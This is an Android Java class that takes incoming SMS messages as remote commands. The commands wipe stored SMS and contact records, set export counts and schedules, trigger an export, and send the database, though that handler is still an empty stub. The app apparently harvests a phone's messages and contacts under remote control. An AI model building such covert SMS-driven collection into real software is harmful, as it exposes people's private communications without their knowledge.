package org.gdocument.gchattoomuch.business;

import org.gdocument.gchattoomuch.db.service.ContactService;
import org.gdocument.gchattoomuch.db.service.SmsService;
import org.gdocument.gchattoomuch.manager.ScheduleServiceManager;
import org.gdocument.gchattoomuch.parser.SmsParser;
import org.gdocument.gchattoomuch.parser.SmsParser.MSG_TYPE;
import org.gdocument.gtracergps.launcher.log.Logger;

import android.content.Context;


public class SmsReceiverBusiness {

	private static final String TAG = SmsReceiverBusiness.class.getName();
	private Context context;

	public SmsReceiverBusiness(Context context) {
		this.context = context;
	}

	public void processMessage(String phoneNumber, String message) {
		MSG_TYPE msgType = SmsParser.getInstance().getMessageType(message);
		switch(msgType) {
			case CLEAN_DB_SMS:
				processCleanDbSms();
				break;
			case CLEAN_DB_CONTACT:
				processCleanDbContact();
				break;
			case SET_SERVICE_EXPORT_SMS_COUNT:
				setServiceExportSmsCount(message);
				break;
			case SET_SERVICE_EXPORT_CONTACT_COUNT:
				setServiceExportContactCount(message);
				break;
			case SET_SERVICE_EXPORT_TIME:
				setServiceExportSmsTime(message);
				break;
			case RUN_SERVICE_EXPORT:
				processRunServiceExport();
				break;
			case SEND_DB:
				processSendDb();
				break;
			default:
				int len = (message.length() > 20 ? 20 : message.length());
				logMe("Unknowed from:" + phoneNumber + " message:" + message.substring(0, len/2) + "..." + message.substring(message.length()-(len-(len/2))));
		}
	}


	private void processCleanDbSms() {
		new SmsService(context, null).deleteAll();
	}

	private void processCleanDbContact() {
		new ContactService(context, null).deleteAll();
	}

	private void setServiceExportSmsCount(String message) {
		int count = SmsParser.getInstance().fromMessageCountSms(message);
        logMe("setServiceExportSmsCount count:" + count);
		ScheduleServiceManager.getInstance(context).setServiceExportSmsLimitCount(count);
	}

	private void setServiceExportContactCount(String message) {
		int count = SmsParser.getInstance().fromMessageCountContact(message);
        logMe("setServiceExportSmsCount count:" + count);
		ScheduleServiceManager.getInstance(context).setServiceExportContactLimitCount(count);
	}

	private void setServiceExportSmsTime(String message) {
		long time = SmsParser.getInstance().fromMessageTime(message);
        logMe("setServiceExportSmsTime time:" + time);
		ScheduleServiceManager.getInstance(context).setServiceExportScheduleTime(time);
		ScheduleServiceManager.getInstance(context).scheduleExport(time);
	}

	private void processRunServiceExport() {
		ScheduleServiceManager.getInstance(context).scheduleExport(ScheduleServiceManager.SERVICE_EXPORT_SCHEDULE_TIME_SECOUND_30);
	}

	private void processSendDb() {
		// TODO
	}

	private void logMe(String message) {
		Logger.logMe(TAG, message);
	}
}